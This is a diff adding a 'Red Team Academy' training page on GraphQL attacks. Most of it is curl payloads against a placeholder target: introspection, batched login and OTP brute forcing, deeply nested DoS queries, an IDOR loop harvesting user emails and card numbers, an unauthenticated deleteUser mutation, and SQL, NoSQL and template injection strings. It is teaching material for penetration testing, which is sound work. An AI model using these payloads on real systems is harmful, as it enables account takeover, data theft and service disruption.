@@ -1,0 +1,156 @@
+---
+layout: training-page
+title: "GraphQL Attacks — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - graphql
+  - introspection
+  - idor
+  - injection
+  - batching
+page_key: "web-graphql"
+---
+<h1>GraphQL Attacks</h1>
+  <p>GraphQL's flexible query language introduces unique attack surfaces: introspection leaks the entire API schema, batching enables DoS and brute-force, resolver misconfigurations allow horizontal access control bypass (BOLA), and improper input handling enables injection. Many apps expose GraphQL without adequate access controls.</p>
+
+  <h2>Endpoint Discovery</h2>
+  <pre><code># Common GraphQL endpoints:
+/graphql
+/graphql/v1
+/api/graphql
+/graph
+/gql
+/query
+/api/query
+
+# Discover with ffuf:
+ffuf -u https://target/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -mc 200,400 -H "Content-Type: application/json"
+
+# Check for GraphQL (send introspection query):
+curl -s -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -d '&#123;"query":"&#123; __typename &#125;"&#125;' | jq .
+
+# GraphQL playground typically at:
+https://target/graphql (GET request shows playground UI)</code></pre>
+
+  <h2>Introspection — Schema Enumeration</h2>
+  <p>Introspection returns the full API schema: all types, queries, mutations, and fields. Many production apps leave it enabled.</p>
+  <pre><code># Full introspection query:
+curl -s -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -d '&#123;"query":"&#123; __schema &#123; types &#123; name fields &#123; name type &#123; name kind ofType &#123; name &#125; &#125; &#125; &#125; &#125; &#125;"&#125;' | jq .
+
+# List all queries and mutations:
+curl -s -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -d '&#123;"query":"&#123; __schema &#123; queryType &#123; fields &#123; name description &#125; &#125; mutationType &#123; fields &#123; name description &#125; &#125; &#125; &#125;"&#125;' | jq .
+
+# GraphQL Voyager — visualize schema (browser tool):
+# Paste introspection output into https://graphql-voyager.netlify.app/
+
+# InQL (Burp extension + standalone):
+pip3 install inql
+inql -t https://target/graphql    # dumps schema, generates wordlist
+
+# graphql-cop — security audit tool:
+pip3 install graphql-cop
+graphql-cop -t https://target/graphql -o json | jq .
+
+# Field suggestions (when introspection disabled):
+# GraphQL suggests similar field names on typos:
+curl -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -d '&#123;"query":"&#123; usrs &#123; id &#125; &#125;"&#125;'
+# Response: "Did you mean 'users'?"
+# Use this to enumerate field names iteratively</code></pre>
+
+  <h2>Batching Attacks</h2>
+  <p>GraphQL supports sending multiple queries in one request (batching). This bypasses rate limiting and enables brute force.</p>
+  <pre><code># Array batching (send N queries in one request):
+curl -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -d '[
+    &#123;"query":"mutation &#123; login(user:\"admin\",pass:\"password1\") &#123; token &#125; &#125;"&#125;,
+    &#123;"query":"mutation &#123; login(user:\"admin\",pass:\"password2\") &#123; token &#125; &#125;"&#125;,
+    &#123;"query":"mutation &#123; login(user:\"admin\",pass:\"password3\") &#123; token &#125; &#125;"&#125;
+  ]'
+
+# Alias batching (alternate syntax — same effect):
+curl -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -d '&#123;"query":"&#123;
+    a: login(user:\"admin\",pass:\"pass1\") &#123; token &#125;
+    b: login(user:\"admin\",pass:\"pass2\") &#123; token &#125;
+    c: login(user:\"admin\",pass:\"pass3\") &#123; token &#125;
+  &#125;"&#125;'
+
+# Brute force OTP via batching (bypass rate limit):
+# Generate batch of 10000 OTP guesses in one request
+# Tools: Burp Intruder with batching, custom scripts
+
+# GraphQL DoS via deeply nested queries:
+curl -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -d '&#123;"query":"&#123; user &#123; friends &#123; friends &#123; friends &#123; friends &#123; friends &#123; id &#125; &#125; &#125; &#125; &#125; &#125; &#125;"&#125;'</code></pre>
+
+  <h2>BOLA / IDOR via GraphQL</h2>
+  <p>GraphQL resolvers often fail to check authorization on object-level access — query another user's data by changing their ID.</p>
+  <pre><code># Classic IDOR — access another user's private data:
+# Your user ID is 42:
+curl -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer YOUR_TOKEN" \
+  -d '&#123;"query":"&#123; user(id: 1) &#123; email phone address paymentMethods &#123; cardNumber &#125; &#125; &#125;"&#125;'
+# Try IDs 1, 2, 3... to access other users
+
+# UUID-based IDs — use introspection to find numeric or UUID fields
+# Mass IDOR — iterate through IDs:
+for i in &#123;1..100&#125;; do
+  curl -s -X POST https://target/graphql \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer TOKEN" \
+    -d "&#123;\"query\":\"&#123; user(id: $i) &#123; id email &#125; &#125;\"&#125;" | jq '.data.user'
+done
+
+# Access admin resolvers without authorization:
+# Try mutations available in schema that lack auth:
+curl -X POST https://target/graphql \
+  -d '&#123;"query":"mutation &#123; deleteUser(id:1) &#123; success &#125; &#125;"&#125;'</code></pre>
+
+  <h2>GraphQL Injection</h2>
+  <pre><code># SQL injection via GraphQL arguments:
+curl -X POST https://target/graphql \
+  -H "Content-Type: application/json" \
+  -d '&#123;"query":"&#123; user(name: \"admin'--\") &#123; id email &#125; &#125;"&#125;'
+# Or use variables (cleaner):
+-d '&#123;"query":"query($n:String!)&#123;user(name:$n)&#123;id email&#125;&#125;","variables":&#123;"n":"admin'--"&#125;&#125;'
+
+# NoSQL injection via GraphQL (MongoDB backend):
+-d '&#123;"query":"&#123; users(filter: \"&#123;$gt: ''&#125;\") &#123; id &#125; &#125;"&#125;'
+
+# SSTI via GraphQL (if description fields are templated):
+-d '&#123;"query":"mutation&#123;createPost(content:\"&#123;&#123;7*7&#125;&#125;\")&#123;id content&#125;&#125;"&#125;'</code></pre>
+
+  <h2>Subscription Attacks</h2>
+  <pre><code># GraphQL subscriptions = real-time WebSocket data
+# Connect to subscription endpoint (usually WebSocket):
+wscat -c wss://target/graphql \
+  -H "Authorization: Bearer TOKEN"
+
+# Subscribe to other users' events:
+&#123;"type":"connection_init"&#125;
+&#123;"type":"start","id":"1","payload":&#123;"query":"subscription&#123;messageReceived(userId:1)&#123;content sender&#125;&#125;"&#125;&#125;
+
+# IDOR in subscriptions — subscribe to another user's notifications</code></pre>
+
+  <h2>Tools &amp; Resources</h2>
+  <ul>
+    <li>InQL (Burp + CLI) — <code>github.com/doyensec/inql</code></li>
+    <li>graphql-cop — <code>github.com/dolevf/graphql-cop</code></li>
+    <li>GraphQL Voyager — schema visualizer</li>
+    <li>Clairvoyance — <code>github.com/nicholasaleks/clairvoyance</code> (field guessing when introspection disabled)</li>
+    <li>HackTricks GraphQL — <code>book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql</code></li>
+    <li>PortSwigger GraphQL labs — <code>portswigger.net/web-security/graphql</code></li>
+  </ul>
